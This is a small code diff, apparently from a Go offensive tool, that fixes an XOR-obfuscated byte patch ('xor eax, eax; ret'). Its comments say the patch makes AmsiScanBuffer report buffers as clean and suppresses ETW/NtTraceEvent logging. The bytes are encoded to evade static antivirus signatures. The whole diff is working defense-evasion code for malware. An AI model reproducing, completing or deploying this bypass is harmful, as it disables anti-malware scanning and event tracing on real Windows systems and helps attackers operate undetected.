@@ -139,8 +139,11 @@ func findPidByName(name string) uint32 {
 
 //go:noinline
 func decodeBypassPatch() []byte {
-	// xor eax, eax; ret — encoded at rest to avoid static byte signature
-	enc := []byte{0x40, 0xd1, 0xd2}
+	// xor eax, eax; ret — encoded at rest to avoid static byte signature.
+	// Decoded bytes must be {0x31,0xC0,0xC3} (returns 0 / "clean" for
+	// AmsiScanBuffer and suppresses the event write for Etw*/NtTraceEvent).
+	// 0x40^0x71=0x31, 0xb1^0x71=0xC0, 0xb2^0x71=0xC3.
+	enc := []byte{0x40, 0xb1, 0xb2}
 	for i := range enc {
 		enc[i] ^= 0x71
 	}
